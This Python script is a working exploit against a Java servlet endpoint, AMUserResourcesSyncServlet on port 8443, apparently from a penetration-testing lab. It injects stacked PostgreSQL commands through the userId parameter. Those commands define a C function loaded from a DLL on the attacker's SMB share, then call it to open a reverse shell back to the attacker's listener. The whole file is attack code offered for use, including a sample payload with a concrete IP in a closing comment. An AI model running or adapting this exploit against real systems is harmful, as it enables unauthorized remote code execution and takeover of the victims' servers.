import sys, re, os
import base64
import requests
from bs4 import BeautifulSoup
import urllib.parse

def send_psql_command(ip, command):
	print(f"Sending command: {command}")

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	userId = f"1;{command};--+"
	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet"
	
	# If use raw data, must specify x-www-form-urlencoded header
	data = f"ForMasRange=1&userId={userId}"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	r = s.post(target,data=data,headers=headers,verify=False)
	print(r)

def main():
	if len(sys.argv) != 3:
		print (f"(+) usage: {sys.argv[0]} <target> <LPORT>")
		print (f"(+) eg: {sys.argv[0]} 192.168.121.103 8000")
		sys.exit(-1)

	ip = sys.argv[1]
	LPORT = sys.argv[2]

	print("Ensure Netcat listener and SMB share with DLL file is running......")

	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]

	create_function_command = f'''\
CREATE OR REPLACE FUNCTION connect_back(text, integer)\
RETURNS void AS $$\\\\{LHOST}\\share\\connect_back.dll$$,\
$$connect_back$$ LANGUAGE C STRICT;'''

	send_psql_command(ip=ip, command=create_function_command)

	connect_command = f'''\
select connect_back($${LHOST}$$, {LPORT});\
	'''

	send_psql_command(ip=ip, command=connect_command)
if __name__ == '__main__':
	main()

# CREATE OR REPLACE FUNCTION connect_back(text, integer)RETURNS void AS $$\\\\192.168.45.232\\share\\connect_back.dll$$,$$connect_back$$ LANGUAGE C STRICT;
